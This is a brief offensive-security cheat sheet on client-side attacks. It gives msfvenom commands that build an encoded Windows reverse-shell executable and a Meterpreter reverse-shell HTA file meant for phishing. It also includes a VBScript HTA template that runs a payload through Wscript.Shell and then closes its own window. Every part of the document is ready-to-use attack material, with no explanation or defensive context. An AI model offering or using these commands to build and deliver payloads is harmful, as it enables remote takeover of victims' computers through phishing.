# Client side attacks

## Basic windows executable

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST= LPORT=8990 -e x86/shikata_ga_nai -f exe -o out.exe
```

## .hta phishing

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f hta-psh -o document.hta
```

```vbscript
<script language="VBScript">
  Function Update()
    Dim yz
    Set yz = CreateObject("Wscript.Shell")
    yz.run "PAYLOAD"
    Set yz = Nothing
  End Function
  
  Update
  self.close
</script>
```
